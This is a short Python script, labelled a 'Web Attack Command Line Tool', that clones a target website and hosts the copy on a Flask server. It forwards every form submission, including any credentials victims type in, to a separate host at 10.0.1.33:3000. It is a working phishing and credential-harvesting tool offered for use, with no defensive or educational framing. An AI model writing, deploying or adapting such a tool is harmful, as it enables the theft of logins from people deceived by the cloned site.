import os
import sys
import requests
from flask import Flask, render_template_string, request, redirect
from bs4 import BeautifulSoup
import argparse

# Initialize Flask app
app = Flask(__name__)

# Global variable to store cloned website HTML
cloned_html = ""

# Function to fetch and clone the target website
def clone_website(target_url):
    try:
        print(f"[INFO] Fetching the target website: {target_url}")
        response = requests.get(target_url)
        if response.status_code == 200:
            print("[INFO] Website cloned successfully!")
            return response.text
        else:
            print(f"[ERROR] Failed to fetch the website. Status code: {response.status_code}")
            return None
    except requests.RequestException as e:
        print(f"[ERROR] Error fetching website: {e}")
        return None

# Function to forward form data to another server (http://10.0.1.33:3000)
def forward_data(form_data, target_url="http://10.0.1.33:3000"):
    try:
        response = requests.post(target_url, data=form_data)
        if response.status_code == 200:
            print(f"[INFO] Data forwarded successfully to {target_url}")
        else:
            print(f"[ERROR] Failed to forward data. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Error forwarding data: {e}")

# Flask route to handle form submissions and forward data
@app.route("/", methods=["GET", "POST"])
def handle_form():
    if request.method == "POST":
        form_data = request.form
        forward_data(form_data)  # Forward form data to the target server
        return redirect("/")  # Redirect to the homepage after submission
    return render_template_string(cloned_html)

# Command-line interface for the tool
def start_cli():
    parser = argparse.ArgumentParser(description="Web Attack Command Line Tool")
    parser.add_argument("command", help="The command to execute (e.g., 'clone')")
    parser.add_argument("target", help="The target URL to clone", nargs="?")
    args = parser.parse_args()

    if args.command == "clone" and args.target:
        print(f"[INFO] Cloning target website: {args.target}")
        cloned_website = clone_website(args.target)
        if cloned_website:
            global cloned_html
            cloned_html = cloned_website
            # Start Flask server to host the cloned website
            print("[INFO] Starting Flask server to host the cloned website...")
            app.run(host="0.0.0.0", port=5000)
    else:
        print("[ERROR] Invalid command or missing target URL")

# Main entry point
if __name__ == "__main__":
    start_cli()
